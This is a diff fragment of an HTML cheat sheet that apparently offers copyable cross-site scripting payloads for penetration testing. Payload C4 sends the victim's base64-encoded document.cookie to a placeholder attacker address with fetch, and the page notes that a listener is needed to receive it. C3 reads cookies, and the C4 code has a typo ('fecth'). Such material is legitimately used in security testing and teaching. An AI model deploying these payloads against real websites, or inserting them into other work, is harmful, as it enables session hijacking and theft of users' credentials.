@@ -45,15 +45,15 @@
 information, stole information, etc. </p>
 <p><b>COMMON TESTS:</b>
 
-<b>C1: </b><p id="RTA01"><mark>&lt;h1&gt;TEST&lt;/h1&gt;</mark></p>|| NORMAL TEST TO KNOW IF VULNERABILITY EXIST
+<b>C1: </b><p id="RTA01"><mark>&lt;h1&gt;TEST&lt;/h1&gt;</mark></p>
 	
-<b>C2: </b><p id="RTA02"><mark>&lt;script&gt;alert('XSS');&lt;/script&gt;</mark></p> || NORMAL TEST TO KNOW IF VULNERABILITY EXIST	
+<b>C2: </b><p id="RTA02"><mark>&lt;script&gt;alert('XSS');&lt;/script&gt;</mark></p>|| C1 & C2, NORMAL TEST TO KNOW IF VULNERABILITY EXIST	
 
-<b>C3: </b><p id="RTA03"><mark>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</mark></p> || NORMAL TEST TO RETRIEVE COOKIES
+<b>C3: </b><p id="RTA03"><mark>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</mark></p>|| NORMAL TEST TO RETRIEVE COOKIES
 
-<b>C4: </b><p id="RTA04"><mark>&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt;</mark></p> || STOLE ENCODED BASE64 COOKIE
+<b>C4: </b><p id="RTA04"><mark>&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt;</mark></p>|| STOLE ENCODED BASE64 COOKIE
 
-*for this to work, it is needed a python server or any listener to retrieve the content.
+*for this to work, it is needed a python server or any listener to retrieve the content.<br>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA02')">.C2.</button>  | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA03')">.C3.</button>  | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA04')">.C4.</button> 
 	
